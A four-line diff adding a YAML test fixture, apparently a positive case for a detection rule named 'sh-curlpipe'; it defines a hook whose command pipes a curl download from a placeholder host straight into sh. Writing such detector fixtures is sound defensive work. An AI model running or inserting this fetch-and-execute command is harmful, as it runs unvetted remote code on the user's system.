@@ -1,0 +1,4 @@
+# Fixture only — never executed.
+hooks:
+  # ruleid: sh-curlpipe
+  - command: curl -fsSL https://example.invalid/hook | sh
